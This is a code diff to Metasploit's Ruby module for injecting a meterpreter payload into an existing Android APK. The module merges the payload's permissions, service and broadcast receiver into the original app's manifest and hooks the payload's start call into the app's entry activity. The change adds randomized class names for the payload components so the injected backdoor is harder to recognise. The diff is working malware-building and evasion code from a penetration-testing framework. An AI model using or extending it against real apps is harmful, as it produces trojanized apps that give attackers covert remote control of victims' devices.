@@ -68,7 +68,7 @@ class Msf::Payload::Apk
     }
   end
 
-  def fix_manifest(tempdir, package)
+  def fix_manifest(tempdir, package, main_service, main_broadcast_receiver)
     #Load payload's manifest
     payload_manifest = parse_manifest("#{tempdir}/payload/AndroidManifest.xml")
     payload_permissions = payload_manifest.xpath("//manifest/uses-permission")
@@ -82,6 +82,7 @@ class Msf::Payload::Apk
       name = permission.attribute("name").to_s
       old_permissions << name
     end
+    old_permissions.shuffle
 
     application = original_manifest.xpath('//manifest/application')
     payload_permissions.each do |permission|
@@ -100,8 +101,9 @@ class Msf::Payload::Apk
     application = original_manifest.at_xpath('/manifest/application')
     receiver = payload_manifest.at_xpath('/manifest/application/receiver')
     service = payload_manifest.at_xpath('/manifest/application/service')
-    receiver.attributes["name"].value = package + receiver.attributes["name"].value
-    service.attributes["name"].value = package + service.attributes["name"].value
+    receiver.attributes["name"].value = package + '.' + main_broadcast_receiver
+    receiver.attributes["label"].value = main_broadcast_receiver
+    service.attributes["name"].value = package + '.' + main_service
     application << receiver.to_xml
     application << service.to_xml
 
@@ -212,6 +214,10 @@ class Msf::Payload::Apk
 
     package = amanifest.xpath("//manifest").first['package']
     package = package + ".#{Rex::Text::rand_text_alpha_lower(5)}"
+    classes = {}
+    classes['Payload'] = "#{Rex::Text::rand_text_alpha_lower(5)}".capitalize
+    classes['MainService'] = "#{Rex::Text::rand_text_alpha_lower(5)}".capitalize
+    classes['MainBroadcastReceiver'] = "#{Rex::Text::rand_text_alpha_lower(5)}".capitalize
     package_slash = package.gsub(/\./, "/")
     print_status "Adding payload as package #{package}\n"
     payload_files = Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/*.smali")
@@ -221,12 +227,19 @@ class Msf::Payload::Apk
     # Copy over the payload files, fixing up the smali code
     payload_files.each do |file_name|
       smali = File.read(file_name)
-      newsmali = smali.gsub(/com\/metasploit\/stage/, package_slash)
-      newfilename = "#{payload_dir}#{File.basename file_name}"
-      File.open(newfilename, "wb") {|file| file.puts newsmali }
+      smali_class = File.basename file_name
+      for oldclass, newclass in classes
+        if smali_class == "#{oldclass}.smali"
+          smali_class = "#{newclass}.smali"
+        end
+        smali.gsub!(/com\/metasploit\/stage\/#{oldclass}/, package_slash + "/" + newclass)
+      end
+      smali.gsub!(/com\/metasploit\/stage/, package_slash)
+      newfilename = "#{payload_dir}#{smali_class}"
+      File.open(newfilename, "wb") {|file| file.puts smali }
     end
 
-    payloadhook = %Q^invoke-static {}, L#{package_slash}/MainService;->start()V
+    payloadhook = %Q^invoke-static {}, L#{package_slash}/#{classes['MainService']};->start()V
 
     ^ + entrypoint
     hookedsmali = activitysmali.sub(entrypoint, payloadhook)
@@ -237,7 +250,7 @@ class Msf::Payload::Apk
     injected_apk = "#{tempdir}/output.apk"
     aligned_apk = "#{tempdir}/aligned.apk"
     print_status "Poisoning the manifest with meterpreter permissions..\n"
-    fix_manifest(tempdir, package)
+    fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReceiver'])
 
     print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}\n"
     run_cmd("apktool b -o #{injected_apk} #{tempdir}/original")
